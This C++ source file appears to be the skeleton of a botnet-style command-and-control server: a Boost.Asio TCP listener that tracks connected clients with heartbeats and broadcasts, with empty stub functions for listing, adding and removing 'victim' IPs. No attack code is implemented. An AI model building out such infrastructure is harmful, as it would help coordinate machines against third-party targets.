#include "server.h"

server::server(io::io_context& io_context, std::uint16_t port)
    : io_context_(io_context), acceptor_(io_context, tcp::endpoint(tcp::v4(), port)) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]", boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2)},
	};
}

void server::start() {
	routine_future_ = std::async(std::launch::async, &server::pingClients,
				     this);  // TODO: substitude this by boost::asio internal timeout clock
	accept();
}

void server::accept() {
	socket_.emplace(io_context_);
	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
}

void server::onAccept(err error_code) {
	int client_id = generateId();
	clients_sessions_container_.insert(
	    std::make_pair(client_id, std::make_shared<session>(std::move(*socket_), io_context_, client_id)));
	auto& client = clients_sessions_container_.find(client_id)->second;

	client->send("#: Connected succesfully\n");
	std::cout << "New client connected." << std::endl;

	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	accept();
}

void server::handleResponse(std::string& query, session* client) {
	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["params"], client);
}

void server::handleAlive(std::vector<std::string>& params, session* client) {
	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
}

void server::initManager(std::string passwd) {
	// TODO: generate & save hash of given password for access to manager methods
	//       & add the manager.
}

bool server::checkCredentials(std::string passwd) {
	// TODO: check if given password coincides with saved admin hash.
	return false;
}

void server::getClients() {
	// TODO: (response function) return all present clients info.
}

void server::getVictims() {
	// TODO: (response function) return all present victims ip's.
}

void server::addVictim(std::string ip) {
	// TODO: (response function) add victim to global list of victims.
}

void server::removeClient(std::string ip) {
	// TODO: (response function) remove client from clients_map.
}

void server::removeVictim(std::string ip) {
	// TODO: (response function) remove victim from victim list.
}

void server::pingClients() {
	while (true) {
		usleep(INACTIVITY_TIMEOUT);

		std::vector<long int> inactive_clients;

		for (auto& client : clients_sessions_container_) {
			client.second->inactive_timeout_count_++;

			if (client.second->inactive_timeout_count_ >= 3) {
				client.second->send("Disconecting due to inactivity\n");
				std::cout << "Disconecting " << client.second->endpoint_ << " due to inactivity" << std::endl;

				inactive_clients.push_back(client.second->id_);
				client.second->stop();
			} else {
				client.second->send(":msg [ARE_YOU_ALIVE]\n");
			}
		}
		{
			std::unique_lock<std::mutex> lock(clients_m_);
			for (auto& client_id : inactive_clients) {
				clients_sessions_container_.erase(client_id);
			}
		}
	}
}

void server::sendAllClients(std::string const& msg) {
	for (auto& pair : clients_sessions_container_) {
		pair.second->send(msg);
	}
}

long int server::generateId() {
	clients_m_.lock();
	long int id =
	    clients_sessions_container_.size() +
	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
	clients_m_.unlock();
	return id;
}